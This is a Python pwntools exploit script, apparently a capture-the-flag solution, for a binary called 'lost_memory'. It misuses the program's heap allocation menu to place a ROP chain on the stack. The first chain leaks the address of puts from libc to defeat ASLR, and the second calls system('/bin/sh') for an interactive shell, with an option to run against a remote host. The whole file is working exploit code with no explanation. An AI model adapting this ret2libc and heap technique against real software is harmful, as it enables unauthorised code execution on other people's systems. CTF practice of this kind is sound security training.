#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('lost_memory')
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def allocate_memory(size):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b"?", str(size).encode())

def write_memory(data):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b"?", data)

def select_index(idx):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b")", str(idx).encode())

def free_memory():
    io.sendlineafter(b":", b"4")

def store_stack():
    io.sendlineafter(b":", b"5")
    io.recvuntil(b": ")
    addr = int(io.recvline().strip(), 16)
    info("stack: %#x", addr)


def solve():

    offset = 32
    pop_rdi = 0x40132e # pop rdi; ret; 

    ropchain = flat({
        offset: [
            pop_rdi,
            exe.got["puts"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    })
    
    for i in range(2):
        select_index(i)
        allocate_memory(0x50)
    
    for i in range(2):
        select_index(i)
        free_memory()

    store_stack()
    select_index(0)

    for _ in range(2):
        allocate_memory(0x50)

    write_memory(ropchain)

    io.sendlineafter(b":", b"6")

    io.recvuntil(b"Exiting...\n")
    puts = u64(io.recvline().strip(b"\n").ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    offset = 32
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    ropchain = flat({
        offset: [
            pop_rdi,
            sh,
            pop_rdi + 1,
            system
        ]
    })

    for i in range(2):
        select_index(i)
        allocate_memory(0x50)
    
    for i in range(2):
        select_index(i)
        free_memory()

    store_stack()
    select_index(0)

    for _ in range(2):
        allocate_memory(0x50)

    write_memory(ropchain)
    io.sendlineafter(b":", b"6")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

